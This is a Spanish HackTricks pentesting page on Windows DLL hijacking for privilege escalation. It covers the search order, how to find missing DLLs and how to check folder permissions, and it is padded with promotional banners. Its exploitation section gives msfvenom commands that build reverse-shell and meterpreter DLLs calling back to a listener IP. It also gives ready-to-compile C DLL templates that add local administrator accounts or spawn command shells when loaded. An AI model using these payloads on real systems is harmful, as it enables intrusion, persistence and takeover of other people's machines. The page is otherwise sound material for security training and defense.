# Secuestro de DLL

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Consejo de recompensa por errores**: **Regístrate** en **Intigriti**, una plataforma premium de **recompensas por errores creada por hackers, para hackers**. ¡Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Información Básica

El Secuestro de DLL implica manipular una aplicación de confianza para cargar una DLL maliciosa. Este término abarca varias tácticas como **Suplantación, Inyección y Carga Lateral de DLL**. Se utiliza principalmente para ejecución de código, lograr persistencia y, menos comúnmente, escalada de privilegios. A pesar del enfoque en la escalada aquí, el método de secuestro sigue siendo consistente en todos los objetivos.

### Técnicas Comunes

Se emplean varios métodos para el secuestro de DLL, cada uno con su efectividad dependiendo de la estrategia de carga de DLL de la aplicación:

1. **Reemplazo de DLL**: Sustituir una DLL genuina por una maliciosa, opcionalmente utilizando Proxying de DLL para preservar la funcionalidad de la DLL original.
2. **Secuestro del Orden de Búsqueda de DLL**: Colocar la DLL maliciosa en una ruta de búsqueda antes que la legítima, explotando el patrón de búsqueda de la aplicación.
3. **Secuestro de DLL Fantasma**: Crear una DLL maliciosa para que una aplicación la cargue, pensando que es una DLL requerida inexistente.
4. **Redirección de DLL**: Modificar parámetros de búsqueda como `%PATH%` o archivos `.exe.manifest` / `.exe.local` para dirigir la aplicación a la DLL maliciosa.
5. **Reemplazo de DLL WinSxS**: Sustituir la DLL legítima por una contraparte maliciosa en el directorio WinSxS, un método a menudo asociado con la carga lateral de DLL.
6. **Secuestro de DLL de Ruta Relativa**: Colocar la DLL maliciosa en un directorio controlado por el usuario con la aplicación copiada, similar a las técnicas de Ejecución de Proxy Binario.

## Encontrar Dlls faltantes

La forma más común de encontrar Dlls faltantes dentro de un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **siguientes 2 filtros**:

![](<../../../.gitbook/assets/image (961).png>)

![](<../../../.gitbook/assets/image (230).png>)

y mostrar solo la **Actividad del Sistema de Archivos**:

![](<../../../.gitbook/assets/image (153).png>)

Si estás buscando **dlls faltantes en general**, déjalo ejecutándose durante algunos **segundos**.\
Si estás buscando una **dll faltante dentro de un ejecutable específico**, debes configurar **otro filtro como "Nombre del Proceso" "contiene" "\<nombre del ejecutable>", ejecutarlo y detener la captura de eventos**.

## Explotando Dlls faltantes

Para escalar privilegios, la mejor oportunidad que tenemos es poder **escribir una dll que un proceso privilegiado intentará cargar** en algún **lugar donde se va a buscar**. Por lo tanto, podremos **escribir** una dll en una **carpeta** donde la **dll se busque antes** que en la carpeta donde está la **dll original** (caso extraño), o podremos **escribir en alguna carpeta donde se buscará la dll** y la **dll original no exista** en ninguna carpeta.

### Orden de Búsqueda de Dll

Dentro de la [**documentación de Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) puedes encontrar cómo se cargan específicamente las Dlls.

Las aplicaciones de **Windows** buscan DLLs siguiendo un conjunto de **rutas de búsqueda predefinidas**, siguiendo una secuencia particular. El problema del secuestro de DLL surge cuando se coloca estratégicamente una DLL dañina en uno de estos directorios, asegurando que se cargue antes que la DLL auténtica. Una solución para prevenir esto es asegurarse de que la aplicación utilice rutas absolutas al referirse a las DLL que requiere.

Puedes ver el **orden de búsqueda de DLL en sistemas de 32 bits** a continuación:

1. El directorio desde el cual se cargó la aplicación.
2. El directorio del sistema. Usa la función [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio.(_C:\Windows\System32_)
3. El directorio del sistema de 16 bits. No hay una función que obtenga la ruta de este directorio, pero se busca. (_C:\Windows\System_)
4. El directorio de Windows. Usa la función [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio.
1. (_C:\Windows_)
5. El directorio actual.
6. Los directorios que se enumeran en la variable de entorno PATH. Ten en cuenta que esto no incluye la ruta por aplicación especificada por la clave del registro **App Paths**. La clave **App Paths** no se utiliza al calcular la ruta de búsqueda de DLL.

Ese es el **orden de búsqueda predeterminado** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual asciende al segundo lugar. Para deshabilitar esta característica, crea el valor del registro **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y configúralo en 0 (predeterminado habilitado).

Si se llama a la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) con **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.

Finalmente, ten en cuenta que **una dll podría cargarse indicando la ruta absoluta en lugar del nombre solamente**. En ese caso, esa dll **solo se buscará en esa ruta** (si la dll tiene dependencias, se buscarán como si se hubieran cargado solo por nombre).

Existen otras formas de alterar el orden de búsqueda pero no las voy a explicar aquí.
#### Excepciones en el orden de búsqueda de DLL según la documentación de Windows

Se señalan ciertas excepciones al orden de búsqueda estándar de DLL en la documentación de Windows:

- Cuando se encuentra una **DLL que comparte su nombre con una ya cargada en memoria**, el sistema omite la búsqueda habitual. En su lugar, realiza una verificación de redirección y un manifiesto antes de recurrir a la DLL ya en memoria. **En este escenario, el sistema no realiza una búsqueda de la DLL**.
- En casos en los que la DLL es reconocida como una **DLL conocida** para la versión actual de Windows, el sistema utilizará su versión de la DLL conocida, junto con cualquiera de sus DLL dependientes, **omitir el proceso de búsqueda**. La clave del registro **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estas DLL conocidas.
- Si una **DLL tiene dependencias**, la búsqueda de estas DLL dependientes se realiza como si solo estuvieran indicadas por sus **nombres de módulo**, independientemente de si la DLL inicial fue identificada a través de una ruta completa.

### Escalando Privilegios

**Requisitos**:

- Identificar un proceso que opere o vaya a operar bajo **diferentes privilegios** (movimiento horizontal o lateral), que **carezca de una DLL**.
- Asegurarse de que haya **permisos de escritura** disponibles para cualquier **directorio** en el que se **busque la DLL**. Esta ubicación podría ser el directorio del ejecutable o un directorio dentro de la ruta del sistema.

Sí, los requisitos son complicados de encontrar ya que **por defecto es un poco extraño encontrar un ejecutable privilegiado que falte a una DLL** e incluso es **más extraño tener permisos de escritura en una carpeta de la ruta del sistema** (por defecto no se puede). Pero, en entornos mal configurados esto es posible.\
En el caso de que tengas suerte y cumplas con los requisitos, podrías revisar el proyecto [UACME](https://github.com/hfiref0x/UACME). Aunque el **objetivo principal del proyecto es eludir el UAC**, podrías encontrar allí una **Prueba de Concepto (PoC)** de un secuestro de DLL para la versión de Windows que estás utilizando (probablemente solo cambiando la ruta de la carpeta donde tienes permisos de escritura).

Ten en cuenta que puedes **verificar tus permisos en una carpeta** haciendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **verificar los permisos de todas las carpetas dentro de la RUTA**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes verificar las importaciones de un ejecutable y las exportaciones de un dll con:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para obtener una guía completa sobre cómo **abusar del secuestro de Dll para escalar privilegios** con permisos para escribir en una carpeta de **Ruta del Sistema**, consulta:

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Herramientas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)comprobará si tienes permisos de escritura en alguna carpeta dentro de la RUTA del sistema.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las funciones de **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll._

### Ejemplo

En caso de encontrar un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear una dll que exporte al menos todas las funciones que el ejecutable importará de ella**. De todos modos, ten en cuenta que el secuestro de Dll es útil para [escalar desde el nivel de Integridad Medio a Alto **(burlando el UAC)**](../../authentication-credentials-uac-and-efs/#uac) o desde [**Alto Integridad a SISTEMA**](../#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **cómo crear una dll válida** dentro de este estudio de secuestro de dll centrado en el secuestro de dll para ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **siguiente sección** puedes encontrar algunos **códigos dll básicos** que podrían ser útiles como **plantillas** o para crear una **dll con funciones no requeridas exportadas**.

## **Creación y compilación de Dlls**

### **Proxificación de Dll**

Básicamente, un **proxy de Dll** es una Dll capaz de **ejecutar tu código malicioso al cargarse** pero también de **exponer** y **funcionar** como **se espera** al **retransmitir todas las llamadas a la biblioteca real**.

Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes indicar un ejecutable y seleccionar la biblioteca que deseas proxificar y **generar una dll proxificada** o indicar la Dll y **generar una dll proxificada**.

### **Meterpreter**

**Obtener shell inversa (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtener un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (no vi una versión x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tu propio

Ten en cuenta que en varios casos, la Dll que compilas debe **exportar varias funciones** que serán cargadas por el proceso víctima, si estas funciones no existen, el **binario no podrá cargarlas** y el **exploit fallará**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Referencias

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Consejo de recompensa por errores**: **regístrate** en **Intigriti**, una plataforma de **recompensas por errores premium creada por hackers, para hackers**. ¡Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
